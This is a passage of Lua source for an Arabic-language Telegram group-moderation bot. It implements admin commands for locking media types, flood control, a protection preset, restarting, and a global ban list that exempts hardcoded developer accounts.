elseif text == 'قفل الملصقات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملصقات بالتقييد ')  
end,nil)
elseif text == 'قفل الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملصقات بالكتم ')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملصقات بالطرد ')  
end,nil)   
elseif text == 'فتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الملصقات ')  
end,nil)   
end
if text == 'قفل التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التوجيه ')  
end,nil)   
elseif text == 'قفل التوجيه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التوجيه بالتقييد ')  
end,nil)
elseif text == 'قفل التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التوجيه بالكتم ')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل التوجيه بالطرد ')  
end,nil)   
elseif text == 'فتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح التوجيه ')  
end,nil)   
end
if text == 'قفل الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملفات ')  
end,nil)   
elseif text == 'قفل الملفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملفات بالتقييد ')  
end,nil)
elseif text == 'قفل الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملفات بالكتم ')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الملفات بالطرد ')  
end,nil)   
elseif text == 'فتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الملفات ')  
end,nil)   
end
if text == 'قفل السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل السيلفي ')  
end,nil)   
elseif text == 'قفل السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل السيلفي بالتقييد ')  
end,nil)
elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل السيلفي بالكتم ')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل السيلفي بالطرد ')  
end,nil)   
elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح السيلفي ')  
end,nil)   
end
if text == 'قفل الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الماركداون ')  
end,nil)   
elseif text == 'قفل الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الماركداون بالتقييد ')  
end,nil)
elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الماركداون بالكتم ')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الماركداون بالطرد ')  
end,nil)   
elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الماركداون ')  
end,nil)   
end
if text == 'قفل الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الجهات ')  
end,nil)   
elseif text == 'قفل الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الجهات بالتقييد ')  
end,nil)
elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الجهات بالكتم ')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الجهات بالطرد ')  
end,nil)   
elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الجهات ')  
end,nil)   
end
if text == 'قفل الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكلايش ')  
end,nil)   
elseif text == 'قفل الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكلايش بالتقييد ')  
end,nil)
elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكلايش بالكتم ')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم قفـل الكلايش بالطرد ')  
end,nil)   
elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⋄بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n⋄تـم فتح الكلايش ')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,' ⋄تم قفل التكرار بالطرد')
elseif text == 'قفل التكرار' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,' ⋄تم قفل التكرار')
elseif text == 'قفل التكرار بالتقييد' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,' ⋄تم قفل التكرار بالتقييد')
elseif text == 'قفل التكرار بالكتم' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,' ⋄تم قفل التكرار بالكتم')
elseif text == 'فتح التكرار' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,' ⋄تم فتح التكرار')
end
if text == 'تفعيل الحمايه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'\n⋄تم قفل البوتات بالطرد\n⋄تم وضع الايدي بدون صوره\n⋄تم قفل التكرار بالطرد\n⋄تم قفل الروابط\n⋄تم قفل التوجيه\n⋄تم قفل الملصقات\n⋄تم قفل المتحركه\n⋄تم قفل الفيديو\n⋄تم قفل السب\n⋄تم قفل التعديل\n⋄تم قفل الفارسيه\n⋄تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..')')  
end,nil)
end
--------------------------------------------------------------------------------------------------------------
if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end    
send(msg.chat_id_, msg.id_, ' ⋄تم اعاده تشغيل البوت') 
dofile('Black.lua')  
end 
if text == ("مسح الحظر العام") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n⋄تم مسح قائمه الحظر العام')
return false
end
if text == ("قائمه الحظر العام") then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'GBan:User')
t = "\n⋄قائمة المحظورين عام \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end

if text == ("حظر عام") and msg.reply_to_message_id_ then
if not SudoBot2(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
return false
end
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)

if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره² عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1110101001) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج ليجاند عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1110100000) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) عضو غير معروف عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(119541395) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور صوفي عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot', result.sender_user_id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot2', result.sender_user_id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثاني عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot3', result.sender_user_id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثالث عام")
return false 
end

database:sadd(bot_id..'GBan:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم حظره عام في {`'..Groups..'`} جروب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and SudoBot2(msg) then
local username = text:match("^حظر عام @(.*)$") 
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) البوت عام")
return false 
end
if tonumber(result.id_) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج عام")
return false 
end
if tonumber(result.id_) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره عام")
return false 
end
if tonumber(result.id_) == tonumber(1770288756) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره² عام")
return false 
end
if tonumber(result.id_) == tonumber(1110101001) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج ليجاند عام")
return false 
end
if tonumber(result.id_) == tonumber(1110100000) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) عضو غير معروف عام")
return false 
end
if tonumber(result.id_) == tonumber(119541395) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور صوفي عام")
return false 
end
if tonumber(result.id_) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot', result.id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot2', result.id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثاني عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot3', result.id_) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الثالث عام")
return false 
end

usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم حظره عام في {`'..Groups..'`} جروب'
texts = usertext..status
database:sadd(bot_id..'GBan:User', result.id_)
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and SudoBot2(msg) then
local userid = text:match("^حظر عام (%d+)$")
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end

if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) البوت عام")
return false 
end
if tonumber(userid) == tonumber(944353237) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج عام")
return false 
end
if tonumber(userid) == tonumber(1360140225) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره عام")
return false 
end
if tonumber(userid) == tonumber(1770288756) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) مـبـرمـج افـايـره² عام")
return false 
end
if tonumber(userid) == tonumber(1110101001) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المبرمج ليجاند عام")
return false 
end
if tonumber(userid) == tonumber(1110100000) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) عضو غير معروف عام")
return false 
end
if tonumber(userid) == tonumber(119541395) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور صوفي عام")
return false 
end
if tonumber(userid) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
return false 
end
if database:sismember(bot_id..'Sudo:bot', userid) then
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع (حظر-كتم) المطور الاساسي عام")
